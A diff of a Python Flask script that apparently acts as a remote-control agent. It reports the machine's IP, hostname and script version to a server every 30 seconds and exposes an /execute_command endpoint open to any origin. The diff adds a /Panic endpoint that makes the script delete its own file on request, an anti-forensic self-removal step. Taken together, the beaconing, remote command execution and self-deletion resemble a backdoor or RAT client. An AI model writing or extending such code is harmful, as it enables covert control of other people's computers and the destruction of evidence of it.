@@ -9,6 +9,8 @@ from flask import Flask, request, jsonify, render_template
 from flask_cors import CORS
 import threading
 
+ScriptVersion = 1.3
+
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
@@ -43,11 +45,12 @@ def validate_server():
         else:
             print(f"\nAdres IP {ip_address} nie jest osiągalny na porcie {port_to_check}. Meow\n")
 
-def send_data_to_server(ip_address, pc_name, last_online):
+def send_data_to_server(ip_address, pc_name, last_online, ScriptVersion):
     url = f'http://{ip_address}:3001/ip'
-    data_to_send = {'IP': get_ip(), 'HostName': pc_name, 'LastOnline': str(last_online)}
+    data_to_send = {'IP': get_ip(), 'HostName': pc_name, 'LastOnline': str(last_online), 'ScriptVersion': ScriptVersion}
     response = requests.post(url, json=data_to_send)
     print(response.text)
+
 
 
 def execute_command(command):
@@ -69,9 +72,16 @@ def background_task():
         validated_ip = validate_server()
 
         if validated_ip:
-            send_data_to_server(validated_ip, pc_name, last_online)
+            send_data_to_server(validated_ip, pc_name, last_online, ScriptVersion)
+            print(ScriptVersion)
 
         time.sleep(30)
+
+
+@app.route('/Panic', methods=['POST'])
+def Panic():
+    subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]))
+    sys.exit(0)
 
 @app.route('/execute_command', methods=['POST'])
 def execute_command_route():
